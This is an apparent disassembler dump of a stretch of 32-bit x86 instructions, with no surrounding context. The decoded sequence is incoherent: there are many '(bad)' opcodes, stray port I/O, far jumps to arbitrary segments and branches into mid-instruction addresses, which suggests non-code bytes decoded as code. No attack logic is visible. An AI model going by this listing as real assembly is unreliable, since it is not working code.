  41b9f3:	sbb    dl,BYTE PTR [esp+esi*8]
  41b9f6:	mov    bh,0xc1
  41b9f8:	jnp    0x41b9e8
  41b9fa:	mov    esp,0xaa55cc80
  41b9ff:	(bad)  
  41ba00:	fnstcw WORD PTR [esi-0x29c93964]
  41ba06:	jmp    0x12120e0f
  41ba0b:	jg     0x41ba26
  41ba0d:	out    0x63,eax
  41ba0f:	inc    edx
  41ba10:	scas   al,BYTE PTR es:[edi]
  41ba11:	popa   
  41ba12:	retf   0xb91e
  41ba15:	sti    
  41ba16:	and    BYTE PTR [eax+0x642c7a87],dh
  41ba1c:	out    dx,eax
  41ba1d:	jg     0x41ba3a
  41ba1f:	jecxz  0x41b9c8
  41ba21:	add    DWORD PTR [esi+0x77feb1a4],ebx
  41ba27:	pop    ds
  41ba28:	xor    bl,bl
  41ba2a:	xchg   edi,eax
  41ba2b:	(bad)  
  41ba2c:	cli    
  41ba2d:	adc    bl,bh
  41ba2f:	sbb    al,bh
  41ba31:	sub    al,0xff
  41ba33:	mov    esi,0x159fe9b7
  41ba38:	push   es
  41ba39:	cmc    
  41ba3a:	sar    DWORD PTR [edx-0x1f],0xa7
  41ba3e:	and    al,0xe0
  41ba40:	jo     0x41ba5b
  41ba42:	jg     0x41babb
  41ba44:	imul   ebx,DWORD PTR [edi+0x47],0x49134924
  41ba4b:	adc    BYTE PTR [ecx],bh
  41ba4d:	cmp    ah,ch
  41ba4f:	push   ecx
  41ba50:	fwait
  41ba51:	in     eax,dx
  41ba52:	ret    
  41ba53:	popa   
  41ba54:	jecxz  0x41ba78
  41ba56:	or     eax,0x13d52069
  41ba5b:	jae    0x41bac8
  41ba5d:	call   0x8f9d:0x37ccb23d
  41ba64:	cwde   
  41ba65:	outs   dx,BYTE PTR ds:[esi]
  41ba66:	xchg   esi,eax
  41ba67:	pop    es
  41ba68:	mov    edx,0xfa3f758
  41ba6d:	dec    ebp
  41ba6e:	repz or al,0x8d
  41ba71:	pop    ss
  41ba72:	cmc    
  41ba73:	in     al,dx
  41ba74:	jmp    0xf8f971c2
  41ba79:	mov    esi,0x2c72d868
  41ba7e:	sbb    BYTE PTR [edx-0x2ecca92c],ah
  41ba84:	imul   ecx,DWORD PTR [ebp-0x70],0x6d
  41ba88:	imul   ebp,DWORD PTR [edi],0x4a212430
  41ba8e:	das    
  41ba8f:	fidiv  DWORD PTR [esi+0x2a]
  41ba92:	pop    esp
  41ba93:	aad    0xcc
  41ba95:	xchg   DWORD PTR [edi-0x53],ebp
  41ba98:	inc    edx
  41ba99:	std    
  41ba9a:	cli    
  41ba9b:	mov    eax,ds:0x91b83244
  41baa0:	retf   
  41baa1:	sahf   
  41baa2:	scas   al,BYTE PTR es:[edi]
  41baa3:	mov    bl,0x3a
  41baa5:	or     eax,0x52075a49
  41baaa:	xchg   BYTE PTR ds:0x15373186,al
  41bab0:	xchg   edx,eax
  41bab1:	sbb    dh,cl
  41bab3:	(bad)  
  41bab4:	fidivr WORD PTR [ebx+esi*8]
  41bab7:	or     al,0x5a
  41bab9:	fstp   DWORD PTR [eax-0x1aec747e]
  41babf:	mov    eax,eax
  41bac1:	jno    0x41ba53
  41bac3:	sub    ebp,edi
  41bac5:	and    al,0xf2
  41bac7:	cmp    eax,0x1f8e5739
  41bacc:	fcmovu st,st(6)
  41bace:	mov    ch,BYTE PTR [ebp+0x28683c07]
  41bad4:	or     DWORD PTR [ebp+0x8],0x34
  41bad8:	and    cl,BYTE PTR [eax+esi*1-0x41]
  41badc:	or     BYTE PTR [esi+0x22],dl
  41badf:	cwde   
  41bae0:	push   edx
  41bae1:	cld    
  41bae2:	jns    0x41ba91
  41bae4:	mov    edi,0x3cf4bea9
  41bae9:	xchg   ebx,eax
  41baea:	test   al,0xa8
  41baec:	xchg   DWORD PTR [ebx+0x3c92c09b],esp
  41baf2:	stos   BYTE PTR es:[edi],al
  41baf3:	xor    BYTE PTR [ecx+0x50],dl
  41baf6:	pop    esp
  41baf7:	retf   
  41baf8:	mov    ds:0x73af83fa,eax
  41bafd:	shl    eax,0xe1
  41bb00:	mov    ebp,0x7b37933a
  41bb05:	ins    DWORD PTR es:[edi],dx
  41bb06:	mov    ch,0xe0
  41bb08:	add    al,cl
  41bb0a:	push   esp
  41bb0b:	add    ecx,0x2e
  41bb0e:	mov    ebp,cs
  41bb10:	or     cl,ch
  41bb12:	push   edx
  41bb13:	sti    
  41bb14:	adc    BYTE PTR [edx+0x7697c4a6],cl
  41bb1a:	push   ecx
  41bb1b:	ret    0x254f
  41bb1e:	jns    0x41bb38
  41bb20:	popa   
  41bb21:	pop    esi
  41bb22:	lods   al,BYTE PTR ds:[esi]
  41bb23:	sbb    esp,DWORD PTR [esi+0x63cefb57]
  41bb29:	mov    ebp,0x8494561
  41bb2e:	pop    ds
  41bb2f:	or     eax,0xdbd9715f
  41bb34:	push   cs
  41bb35:	mov    ebp,?
  41bb37:	(bad)  
  41bb38:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41bb3a:	mov    ebp,ecx
  41bb3c:	sub    bl,BYTE PTR [ebp+ebx*1+0x33d79fa5]
  41bb43:	jns    0x41bae7
  41bb45:	int    0x87
  41bb47:	xchg   ebx,eax
  41bb48:	iret   
  41bb49:	pop    edx
  41bb4a:	retf   0xab87
  41bb4d:	fild   WORD PTR [edx-0x6067ae46]
  41bb53:	repnz ror BYTE PTR [esp+edi*4-0x3f9f1485],0xc7
  41bb5c:	pop    ecx
  41bb5d:	(bad)  
  41bb5f:	lock sbb BYTE PTR [esi+eax*4-0xd6687a2],bh
  41bb67:	in     al,0xf
  41bb69:	loope  0x41bb6d
  41bb6b:	dec    esp
  41bb6c:	shl    BYTE PTR [esi-0x74a27671],cl
  41bb72:	outs   dx,DWORD PTR ds:[esi]
  41bb73:	or     BYTE PTR [edx-0xf],dh
  41bb76:	repnz push cs
  41bb78:	jp     0x41bb32
  41bb7a:	ins    BYTE PTR es:[edi],dx
  41bb7b:	mov    esp,0x4f2e78bb
  41bb80:	pop    ebp
  41bb81:	sbb    ecx,DWORD PTR [edi-0x76277614]
  41bb87:	mov    dl,0x3
  41bb89:	push   ss
  41bb8a:	mov    al,0x1f
  41bb8c:	mov    bl,0xf0
  41bb8e:	fldenv [esi-0x1b8e677c]
  41bb94:	xor    bl,BYTE PTR [ebp-0x46]
  41bb97:	adc    cl,bh
  41bb99:	pop    ecx
  41bb9a:	retf   0x6299
  41bb9d:	push   esp
  41bb9e:	iret   
  41bb9f:	jecxz  0x41bbff
  41bba1:	int3   
  41bba2:	sub    ebx,DWORD PTR [edi]
  41bba4:	jecxz  0x41bbe5
  41bba6:	inc    ebx
  41bba7:	(bad)  
  41bba8:	fiadd  DWORD PTR [edx]
  41bbaa:	mov    edi,0x7275a635
  41bbaf:	mov    al,es:0x476fb533
  41bbb5:	int3   
  41bbb6:	pop    esp
  41bbb7:	std    
  41bbb8:	jp     0x41bbf9
  41bbba:	fucom  st(3)
  41bbbc:	jmp    0xf06cc7f6
  41bbc1:	loope  0x41bbdd
  41bbc3:	out    dx,al
  41bbc4:	sar    BYTE PTR [ebp+0x32],cl
  41bbc7:	ror    esp,1
  41bbc9:	xor    al,0x1c
  41bbcb:	out    dx,al
  41bbcc:	xor    edx,eax
  41bbce:	add    ebx,DWORD PTR ds:0x42a359
  41bbd4:	jmp    0x41c0e6
  41bbd9:	(bad)  
  41bbda:	ror    ebx,cl
  41bbdc:	cmp    al,0xdb
  41bbde:	aam    0xcb
  41bbe0:	fist   DWORD PTR [eax+0x79aecda1]
  41bbe6:	pop    ss
  41bbe7:	loopne 0x41bbdf
  41bbe9:	mov    ebx,0x73787f97
  41bbee:	jl     0x41bc68
  41bbf0:	js     0x41bbbf
  41bbf2:	mov    ds:0xb28140db,eax
  41bbf7:	bound  ebp,QWORD PTR [eax]
  41bbf9:	arpl   WORD PTR ds:0xc1eeafac,sp
  41bbff:	cwde   
  41bc00:	frstor [eax+esi*1-0x48d3bf64]
  41bc07:	cmp    dl,BYTE PTR [ecx-0x41]
  41bc0a:	arpl   WORD PTR [ebx],di
  41bc0c:	xchg   ecx,eax
  41bc0d:	add    al,0xe9
  41bc0f:	dec    ebx
  41bc10:	ror    BYTE PTR [ebp-0x16],cl
  41bc13:	mov    ch,0x93
  41bc15:	int    0x31
  41bc17:	out    0xeb,al
  41bc19:	xchg   ebx,eax
  41bc1a:	lahf   
  41bc1b:	pop    es
  41bc1c:	push   cs
  41bc1d:	clc    
  41bc1e:	dec    ebx
  41bc1f:	pop    ds
  41bc20:	push   esi
  41bc21:	ror    dl,1
  41bc23:	popf   
  41bc24:	cmp    ebp,DWORD PTR [eax+0x29e8a333]
  41bc2a:	adc    DWORD PTR [ebx-0x1837eda1],edx
  41bc30:	daa    
  41bc31:	fs enter 0x4e8c,0xeb
  41bc36:	inc    eax
  41bc37:	push   0x3c6c5a59
  41bc3c:	push   0xffffffdb
  41bc3e:	out    0x46,al
  41bc40:	imul   DWORD PTR [ebp-0x4764358e]
  41bc46:	leave  
  41bc47:	cmp    eax,DWORD PTR [edx]
  41bc49:	in     al,dx
  41bc4a:	js     0x41bc43
  41bc4c:	das    
  41bc4d:	or     BYTE PTR [eax-0x17],0x81
  41bc51:	and    eax,0xb9456119
  41bc56:	pop    ds
  41bc57:	mov    ah,0x3d
  41bc59:	cmp    esi,ebp
  41bc5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc5c:	mov    ds:0xb5dbc1fe,eax
  41bc61:	mov    ebp,0x74d61441
  41bc66:	push   cs
  41bc67:	push   edi
  41bc68:	or     ebp,DWORD PTR [ebx]
  41bc6a:	xchg   ebx,eax
  41bc6b:	rcl    BYTE PTR ds:0xafc0ae67,cl
  41bc71:	and    eax,0xc3b9f2ff
  41bc76:	dec    ebp
  41bc77:	pop    ecx
  41bc78:	(bad)  
  41bc79:	sub    DWORD PTR [ebp-0x68c54600],edi
  41bc7f:	scas   eax,DWORD PTR es:[edi]
  41bc80:	push   ebx
  41bc81:	fistp  QWORD PTR ds:0x43ccfdb4
  41bc87:	(bad)  
  41bc88:	(bad)  
  41bc89:	sbb    al,0xba
  41bc8b:	das    
  41bc8c:	jo     0x41bcd0
  41bc8e:	(bad)  
  41bc8f:	adc    eax,DWORD PTR [edi-0x1ddb30c0]
  41bc95:	mov    edi,0xfb0112a7
  41bc9a:	out    0x9e,eax
  41bc9c:	add    eax,0x6a0b230e
  41bca1:	bound  esi,QWORD PTR [ecx+ecx*2-0x70f3bde3]
  41bca8:	stos   DWORD PTR es:[edi],eax
  41bca9:	lock xchg edx,eax
  41bcab:	js     0x41bc9c
  41bcad:	retf   0x361c
  41bcb0:	jmp    0xb384cfdc
  41bcb5:	add    al,0x21
  41bcb7:	cwde   
  41bcb8:	sub    al,0xf4
  41bcba:	cmp    ch,BYTE PTR [esp+ecx*4-0x6b]
  41bcbe:	imul   dh
  41bcc0:	mov    ecx,0x46158b26
  41bcc5:	jecxz  0x41bd2c
  41bcc7:	push   edx
  41bcc8:	inc    eax
  41bcc9:	sar    eax,0x24
  41bccc:	mov    cl,BYTE PTR [ebx+ebp*2]
  41bccf:	mov    esp,0x36adae1a
  41bcd4:	mov    ebp,0xb133eaf9
  41bcd9:	mov    ebp,0xc7964c15
  41bcde:	(bad)  
  41bce0:	cs leave 
  41bce2:	fucomp st(0)
  41bce5:	pop    ebp
  41bce6:	cdq    
  41bce7:	sbb    ch,BYTE PTR [edx]
  41bce9:	out    0x83,eax
  41bceb:	xchg   edx,esi
  41bced:	mov    al,0x48
  41bcef:	nop
  41bcf0:	cwde   
  41bcf1:	add    BYTE PTR [esi*2+0x6dd238b2],bl
  41bcf8:	(bad)
  41bcfb:	mov    ebx,0xccfb530a
  41bd00:	xor    BYTE PTR [ebx+0x4d],al
  41bd03:	pop    ebp
  41bd04:	jbe    0x41bd58
  41bd06:	or     BYTE PTR [ebp-0x23],al
  41bd09:	imul   eax,DWORD PTR [ebp-0x51],0xfa3e4af0
  41bd10:	or     eax,0x8cfdb2c
  41bd15:	jmp    0x41bd19
  41bd17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd18:	int    0xac
  41bd1a:	add    al,0x17
  41bd1c:	or     edi,DWORD PTR [eax+0x24]
  41bd1f:	adc    eax,0xe33f8c22
  41bd24:	inc    esp
  41bd25:	aam    0xae
  41bd27:	sub    edx,DWORD PTR [ecx]
  41bd29:	xor    eax,0x161a6e0b
  41bd2e:	shl    ebx,0x23
  41bd31:	fs sbb eax,0x8681ff97
  41bd37:	lea    edi,[eax+0x7f]
  41bd3a:	cwde   
  41bd3b:	iret   
  41bd3c:	pop    esi
  41bd3d:	and    eax,0x8c18db45
  41bd42:	call   0x46f:0xe9a4520c
  41bd49:	lds    eax,FWORD PTR [edi]
  41bd4b:	xchg   edi,eax
  41bd4c:	mov    edx,0x8cf5c32b
  41bd51:	add    DWORD PTR [ebx+0x409518a],esi
  41bd57:	and    dl,dl
  41bd59:	mov    ecx,0xcdfd0de8
  41bd5e:	cdq    
  41bd5f:	and    ebp,DWORD PTR ds:0x2590d766
  41bd65:	or     eax,0x7a9a996
  41bd6a:	fcomp  QWORD PTR [edi-0xa]
  41bd6d:	(bad)  
  41bd6e:	mov    ah,0x5e
  41bd70:	(bad)  
  41bd72:	xchg   edi,eax
  41bd74:	fucomp st(5)
  41bd76:	pop    ds
  41bd77:	enter  0x9007,0x34
  41bd7b:	scas   eax,DWORD PTR es:[edi]
  41bd7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd7d:	cmp    eax,0x6b
  41bd80:	mov    bh,0x5b
  41bd82:	push   0xffffff91
  41bd84:	jge    0x41bd70
  41bd86:	dec    edi
  41bd87:	and    eax,0x800068ff
  41bd8c:	adc    eax,0xc51e185f
  41bd92:	cmp    ah,BYTE PTR [esi+0xa]
  41bd95:	loopne 0x41bdc3
  41bd97:	shr    DWORD PTR [eax+0xf],1
  41bd9a:	push   ecx
  41bd9b:	cs mov ebx,0x43dac1f8
  41bda1:	aad    0x7d
  41bda3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bda4:	addr16 rcl edi,1
  41bda7:	je     0x41bd50
  41bda9:	xor    ebp,edx
  41bdab:	xor    ch,cl
  41bdad:	repz sbb ebx,DWORD PTR [edi+0x33]
  41bdb1:	daa    
  41bdb2:	ret    0x81e7
  41bdb5:	inc    esp
  41bdb6:	push   eax
  41bdb7:	hlt    
  41bdb8:	xlat   BYTE PTR ds:[ebx]
  41bdb9:	adc    ebp,DWORD PTR [edx+0x8]
  41bdbc:	jge    0x41bd58
  41bdbe:	iret   
  41bdbf:	adc    ch,bl
  41bdc1:	loope  0x41bdc1
  41bdc3:	mov    eax,ds:0x2583ade7
  41bdc8:	in     al,0xfc
  41bdca:	adc    dl,BYTE PTR [edx+0x39]
  41bdcd:	call   0x3f671020
  41bdd2:	jns    0x41bde1
  41bdd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdd5:	fistp  DWORD PTR [ebx+0x7deb5cfb]
  41bddb:	push   0x1e
  41bddd:	loopne 0x41be1a
  41bddf:	fcomp  QWORD PTR [esi+0xa]
  41bde2:	cmp    DWORD PTR [edx+0x7c3dce36],eax
  41bde8:	add    BYTE PTR [eax-0x4b],0x50
  41bdec:	mov    esi,0x5c03c336
  41bdf1:	jp     0x41be30
  41bdf3:	xchg   ebp,eax
  41bdf4:	pushf  
  41bdf5:	jnp    0x41be51
  41bdf7:	push   ecx
  41bdf8:	jb     0x41bd8d
  41bdfa:	outs   dx,DWORD PTR ds:[esi]
  41bdfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdfc:	pop    edi
  41bdfd:	hlt    
  41bdfe:	or     al,0x27
  41be00:	jne    0x41bda4
  41be02:	test   DWORD PTR [eax+0x5c27665d],edx
  41be08:	pop    ebx
  41be09:	xchg   esp,eax
  41be0a:	mov    eax,0x4d71d7a9
  41be0f:	inc    esi
  41be10:	out    0xfd,al
  41be12:	mov    esi,0x11ca1c2b
  41be17:	and    al,0x96
  41be19:	(bad)  
  41be1a:	sti    
  41be1b:	adc    al,0x71
  41be1d:	and    BYTE PTR ds:0x2ef2091c,dh
  41be23:	sub    ch,BYTE PTR [ebx+esi*8+0x64]
  41be27:	arpl   WORD PTR [esi],di
  41be29:	cmp    eax,0xad88f71a
  41be2e:	or     ecx,DWORD PTR [ebx]
  41be30:	dec    esp
  41be31:	xchg   edx,eax
  41be32:	and    cl,BYTE PTR [ebx]
  41be34:	jbe    0x41be09
  41be36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be37:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be39:	xor    ebx,DWORD PTR [edi+esi*1-0x3d1d547e]
  41be40:	and    DWORD PTR [eax+0x1f],eax
  41be43:	push   ebp
  41be44:	out    dx,eax
  41be45:	pop    ebx
  41be46:	gs int 0xd6
  41be49:	dec    ebx
  41be4a:	stos   BYTE PTR es:[edi],al
  41be4b:	fldenv [edx+0x54]
  41be4e:	(bad)  
  41be4f:	lock dec ecx
  41be51:	fadd   DWORD PTR [ebx]
  41be53:	mov    al,0x49
  41be55:	mov    al,0xf1
  41be57:	jle    0x41be7b
  41be59:	scas   eax,DWORD PTR es:[edi]
  41be5a:	adc    ebp,ebp
  41be5c:	pop    ecx
  41be5d:	sbb    bl,BYTE PTR [edx+eax*4]
  41be60:	push   ss
  41be61:	paddb  mm2,QWORD PTR [ecx+0x775a955b]
  41be68:	pop    esi
  41be69:	cmp    BYTE PTR [edi+edi*4],bh
  41be6c:	test   BYTE PTR ds:0x46d62958,0xe9
  41be73:	fisttp WORD PTR ds:[ebx+0x7b93ac0f]
  41be7a:	popf   
  41be7b:	pop    edi
  41be7c:	pop    ecx
  41be7d:	in     eax,0x60
  41be7f:	and    al,0x6a
  41be81:	pop    ss
  41be82:	mov    esp,0x4a235700
  41be87:	imul   ecx,DWORD PTR [eax+0x4f],0xffffff86
  41be8b:	(bad)  
  41be8c:	aad    0x5f
  41be8e:	test   al,0x4e
  41be90:	retf   0x25f0
  41be93:	out    0xb3,eax
  41be95:	add    BYTE PTR [ebx],cl
  41be97:	sbb    dl,BYTE PTR [edi-0x21800e61]
  41be9d:	xlat   BYTE PTR ds:[ebx]
  41be9e:	sbb    ah,al
  41bea0:	jl     0x41bee8
  41bea2:	sub    DWORD PTR [ebp+0x3a],ebp
  41bea5:	and    eax,0x28f8198b
  41beab:	ret    0xcc58
  41beae:	cmp    eax,0xf2cdc62
  41beb3:	jmp    0x3b0bb8fc
  41beb8:	outs   dx,BYTE PTR ds:[esi]
  41beb9:	mov    ebx,gs
  41bebb:	cmp    ebx,esp
  41bebd:	xchg   ebp,eax
  41bebe:	(bad)  
  41bebf:	sub    bh,ah
  41bec1:	xor    edi,DWORD PTR [eax+ecx*4+0x76]
  41bec5:	pop    ebx
  41bec6:	sub    esp,DWORD PTR [eax+0x3afb3892]
  41becc:	bound  esp,QWORD PTR [edi]
  41bece:	mov    eax,ds:0xb822549d
  41bed3:	js     0x41befc
  41bed5:	add    eax,0x2c9852da
  41beda:	mov    esp,0x249c5af4
  41bedf:	inc    ebp
  41bee0:	sub    ah,BYTE PTR [ecx+ebx*2-0x4d]
  41bee4:	push   cs
  41bee5:	cli    
  41bee6:	xchg   edi,eax
  41bee7:	(bad)  
  41bee8:	out    0xac,eax
  41beea:	jge    0x41be81
  41beec:	sahf   
  41beed:	xchg   edx,eax
  41beee:	mov    ds:0x853b5278,al
  41bef3:	mov    esp,0x774dd25f
  41bef8:	inc    esi
  41bef9:	jo     0x41bf7a
  41befb:	jmp    0x760e:0x8030f70f
  41bf02:	(bad)  
  41bf04:	push   0xffffffc1
  41bf06:	mov    ebp,eax
  41bf08:	fstp   TBYTE PTR [esi+0x2a]
  41bf0b:	leave  
  41bf0c:	enter  0x1dc8,0xde
  41bf10:	jno    0x41bf05
  41bf12:	push   esp
  41bf13:	shl    DWORD PTR fs:[ebp-0x7f],1
  41bf17:	cmp    eax,0xa309c792
  41bf1c:	fs call 0x94ae7223
  41bf22:	dec    ebp
  41bf23:	add    BYTE PTR [esi],al
  41bf25:	shl    BYTE PTR ds:[edx-0x67fc4a52],0x81
  41bf2d:	push   esi
  41bf2e:	mov    bl,0xa1
  41bf30:	pop    esi
  41bf31:	pop    esi
  41bf32:	icebp  
  41bf33:	adc    DWORD PTR ss:[ebx+0x2a],0xa71475ea
  41bf3b:	cmp    ebp,DWORD PTR [edx+0x54]
  41bf3e:	jge    0x41bf9d
  41bf40:	mov    al,0xc9
  41bf42:	sbb    al,0xf3
  41bf44:	fldenv [eax+0x4ef73710]
  41bf4a:	mov    edx,0x3057039d
  41bf4f:	mov    eax,0xc0f20bd1
  41bf54:	neg    BYTE PTR [ecx]
  41bf56:	mov    DWORD PTR [ebx-0x2c9f70a9],edi
  41bf5c:	sbb    cl,BYTE PTR [ebx]
  41bf5e:	adc    al,0x99
  41bf60:	repz mov esp,DWORD PTR [ebp-0x626e0b48]
  41bf67:	shl    DWORD PTR [eax-0x4862559e],cl
  41bf6d:	cmp    BYTE PTR [ecx-0x2c],al
  41bf70:	jmp    0x41bf36
  41bf72:	adc    al,0x87
  41bf74:	xchg   ebp,eax
  41bf75:	repnz repz jmp 0xb1e3:0x3ec911be
  41bf7e:	xchg   esp,eax
  41bf7f:	out    dx,eax
  41bf80:	sbb    ecx,DWORD PTR ds:0x4c68b128
  41bf86:	loope  0x41c000
  41bf88:	mov    dh,0xfe
  41bf8a:	sbb    al,0xe8
  41bf8c:	mov    WORD PTR [ebp+0x69],ss
  41bf8f:	xor    BYTE PTR [ecx-0x61],ah
  41bf92:	mov    cl,0xe6
  41bf94:	test   BYTE PTR [ebp+0x53],ah
  41bf97:	rol    BYTE PTR [esi],cl
  41bf99:	out    dx,eax
  41bf9a:	inc    esi
  41bf9b:	sar    DWORD PTR [edx+0x23e39a78],0x67
  41bfa2:	test   al,0x4a
  41bfa4:	cs call 0x4e66:0xc31bda41
  41bfac:	adc    cl,BYTE PTR [ebp+0x120874f4]
  41bfb2:	popf   
  41bfb3:	mov    eax,ds:0xd04314f
  41bfb8:	fcomp  st(3)
  41bfba:	mov    ds:0xb3a0bbe6,eax
  41bfbf:	pop    ebp
  41bfc0:	push   ebx
  41bfc1:	das    
  41bfc2:	fdivr  DWORD PTR [ebx+0x6d961259]
  41bfc8:	inc    ebx
  41bfc9:	and    DWORD PTR [ecx+ecx*8-0x27],edi
  41bfcd:	dec    esi
  41bfce:	and    DWORD PTR [ecx+0x1e7c9b4c],ebx
  41bfd4:	aaa    
  41bfd5:	iret   
  41bfd6:	mov    DWORD PTR [edi+0x19d26b92],ebx
  41bfdc:	mov    bl,0x44
  41bfde:	add    esp,esp
  41bfe0:	js     0x41bfb8
  41bfe2:	out    dx,eax
  41bfe3:	cmp    BYTE PTR [ecx],bl
  41bfe5:	arpl   WORD PTR [esi-0x12],ax
  41bfe8:	sub    BYTE PTR [eax],0x6b
  41bfeb:	dec    sp
  41bfed:	jns    0x41c049
  41bfef:	sbb    al,al
  41bff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bff2:	xchg   edi,eax
  41bff3:	ret    0x11d9
  41bff6:	adc    esi,DWORD PTR [ebp-0x1b]
  41bff9:	mov    ebx,0xaf196986
  41bffe:	imul   BYTE PTR [ebp+0x29]
  41c001:	and    dh,ah
  41c003:	aam    0xd7
  41c005:	test   al,0x12
  41c007:	pop    esp
  41c008:	sti    
  41c009:	jo     0x41c082
  41c00b:	bnd js 0x41bf92
  41c00e:	fsubrp st(6),st
  41c010:	mov    edi,0xcc328bb3
  41c015:	(bad)  
  41c016:	pop    es
  41c017:	shl    DWORD PTR [esi-0x72],cl
  41c01a:	test   DWORD PTR [ebp+0x559d295c],0xeb9b2d92
  41c024:	xchg   edx,eax
  41c025:	icebp  
  41c026:	scas   al,BYTE PTR es:[edi]
  41c027:	xchg   esi,eax
  41c028:	sub    DWORD PTR [edx-0x31],esp
  41c02b:	jmp    0x41c03d
  41c02d:	or     al,0xb3
  41c02f:	das    
  41c030:	movq   mm7,QWORD PTR [edx]
  41c033:	dec    ebp
  41c034:	adc    eax,0xc972f215
  41c039:	out    dx,eax
  41c03a:	pop    ebp
  41c03b:	inc    eax
  41c03c:	add    ch,BYTE PTR [ecx+0x1d]
  41c03f:	aam    0x1c
  41c041:	push   ds
  41c042:	pop    ds
  41c043:	xchg   ebp,eax
  41c044:	push   ebx
  41c045:	push   ss
  41c046:	push   ds
  41c047:	aas    
  41c048:	sub    ah,BYTE PTR [ebp+edi*8+0x46832de2]
  41c04f:	loop   0x41c05c
  41c051:	cmp    BYTE PTR [esi+0x1b],dl
  41c054:	push   ecx
  41c055:	dec    edx
  41c056:	mov    ah,0x1a
  41c058:	and    esi,DWORD PTR gs:[ecx-0xb3f16bc]
  41c05f:	push   ecx
  41c060:	(bad)  
  41c061:	cs inc ebx
  41c063:	hlt    
  41c064:	je     0x41c0d4
  41c066:	inc    ebx
  41c067:	(bad)  
  41c068:	out    dx,eax
  41c069:	call   DWORD PTR [ebx]
  41c06b:	mov    eax,esi
  41c06d:	div    BYTE PTR [edx]
  41c06f:	mov    al,0x5
  41c071:	add    edx,DWORD PTR [ebx]
  41c073:	inc    esi
  41c074:	add    edx,DWORD PTR [ebp+0x7f4cc86f]
  41c07a:	or     ch,BYTE PTR [eax+0x5f86b927]
  41c080:	jb     0x41c075
  41c082:	scas   al,BYTE PTR es:[edi]
  41c083:	inc    eax
  41c084:	jl     0x41c01f
  41c086:	sar    dl,1
  41c088:	pop    ebx
  41c089:	jb     0x41c047
  41c08b:	mov    esi,gs
  41c08d:	jnp    0x41c057
  41c08f:	inc    BYTE PTR [esi-0x18]
  41c092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c094:	pushf  
  41c095:	aam    0xca
  41c097:	loop   0x41c0cd
  41c099:	mov    bl,0x66
  41c09b:	push   0xa60e3cd
  41c0a0:	jnp    0x41c03f
  41c0a2:	bndstx [ebx],(bad)
  41c0a5:	repz push 0x1f
  41c0a8:	test   eax,0x6fb9ffea
  41c0ad:	outs   dx,BYTE PTR ds:[esi]
  41c0ae:	rol    BYTE PTR [edx-0x4f],1
  41c0b1:	jne    0x41c04b
  41c0b3:	xchg   esp,eax
  41c0b4:	pop    eax
  41c0b5:	mov    al,0x8d
  41c0b7:	jmp    0xd51:0xdd70385a
  41c0be:	test   al,0x68
  41c0c0:	dec    edx
  41c0c1:	inc    edx
  41c0c2:	mov    ah,0x89
  41c0c4:	(bad)  
  41c0c5:	adc    eax,0x12e6931
  41c0ca:	or     al,0xb
  41c0cc:	and    esp,DWORD PTR [ebp+0x5c40f8d2]
  41c0d2:	int    0x9c
  41c0d4:	test   DWORD PTR [ebp-0x7a],0x37042c04
  41c0db:	cli    
  41c0dc:	push   0xfffffff2
  41c0de:	lahf   
  41c0df:	mov    edx,0x19b5bce9
  41c0e4:	push   ss
  41c0e5:	adc    al,0x33
  41c0e7:	clc    
  41c0e8:	jmp    0x41c5fa
  41c0ed:	(bad)  
  41c0ee:	int    0xce
  41c0f0:	(bad)  
  41c0f1:	aad    0xd5
  41c0f3:	(bad)  
  41c0f4:	int    0x5f
  41c0f6:	sahf   
  41c0f7:	pusha  
  41c0f8:	mov    WORD PTR [esi+0x1b],?
  41c0fb:	push   0x7f9aae42
  41c100:	js     0x41c175
  41c102:	jl     0x41c17c
  41c104:	js     0x41c12e
  41c106:	cdq    
  41c107:	adc    al,0x12
  41c10a:	repz jbe 0x41c0ee
  41c10d:	jecxz  0x41c0fe
  41c10f:	cld    
  41c110:	imul   ebp,DWORD PTR [edi-0x24],0x28
  41c114:	xchg   ebx,eax
  41c115:	xor    eax,0x37a94b83
  41c11a:	ss jae 0x41c0bf
  41c11d:	clc    
  41c11e:	mov    eax,0xafec3580
  41c123:	rcl    DWORD PTR ds:0x7b08374c,1
  41c129:	mov    ds:0x61c0c4b3,al
  41c12e:	dec    ecx
  41c12f:	xchg   edx,esp
  41c131:	pop    ebp
  41c132:	ins    BYTE PTR es:[edi],dx
  41c133:	sub    dl,ah
  41c135:	in     eax,0x65
  41c137:	stos   DWORD PTR es:[edi],eax
  41c138:	fisubr DWORD PTR [ebx]
  41c13a:	adc    esp,edx
  41c13c:	inc    ebx
  41c13d:	jle    0x41c1b0
  41c13f:	adc    BYTE PTR [ecx+0x19],0x28
  41c143:	xor    BYTE PTR [edx+eiz*8-0x78],bh
  41c147:	hlt    
  41c148:	sahf   
  41c149:	test   DWORD PTR [eax],eax
  41c14b:	stos   BYTE PTR es:[edi],al
  41c14c:	adc    BYTE PTR [edi],bh
  41c14e:	jl     0x41c184
  41c150:	js     0x41c125
  41c152:	ins    DWORD PTR es:[edi],dx
  41c153:	inc    edi
  41c154:	cmp    al,0x4b
  41c156:	(bad)  
  41c157:	mov    ss:0x46628746,al
  41c15d:	xor    al,0x2c
  41c15f:	mov    edx,0x70a4457a
  41c164:	sbb    eax,esi
  41c166:	mov    ecx,0xfa10109b
  41c16b:	fdivrp st(6),st
  41c16d:	stc    
  41c16e:	fcomp  QWORD PTR [ebx+0x10]
  41c171:	lods   al,BYTE PTR ds:[esi]
  41c172:	out    0xf5,eax
  41c174:	inc    ebp
  41c175:	fwait
  41c176:	cmp    al,0xd1
  41c178:	mov    cl,0xa2
  41c17a:	jmp    0x733d:0x27a5233f
  41c181:	and    eax,0x8ac790ea
  41c186:	int3   
  41c187:	or     bh,BYTE PTR ds:0xd4aa8d86
  41c18d:	mov    esp,0xb0b51a7f
  41c192:	jae    0x41c166
  41c194:	and    BYTE PTR [edx],0x4e
